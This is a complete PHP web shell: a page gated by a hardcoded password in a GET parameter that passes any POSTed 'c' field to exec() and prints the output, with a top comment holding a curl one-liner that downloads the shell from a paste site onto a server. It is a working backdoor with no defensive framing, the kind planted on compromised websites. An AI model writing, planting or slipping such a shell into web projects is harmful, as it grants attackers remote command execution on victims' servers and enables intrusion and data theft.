<?php
// curl -s https://paste.ee/d/EYRiP > php_service.php; echo PWNED;
$password = 'zmfhackers';
$auth = False;
if (isset($_GET['pass'])) {
	$pass = $_GET['pass'];
	if ($pass == $password){
		$auth = True;
	}
}
if (!$auth){
	http_response_code(403);
	die('Forbidden');
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width,initial-scale=1" />
</head>
<body>
	<form action="" method="POST">
	<label for="c">Command</label><br>
	<input name="c"/><br>
	</form>
</body>
</html>
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST'){
	if ($auth){
		if (isset($_POST['c'])){
			$c = $_POST['c'];
			echo '<code>';
			exec($c, $out);
			foreach ($out as $line){
				echo htmlentities($line) . '<br>';
			}	
			echo '</code>';
		}
	}
}
?>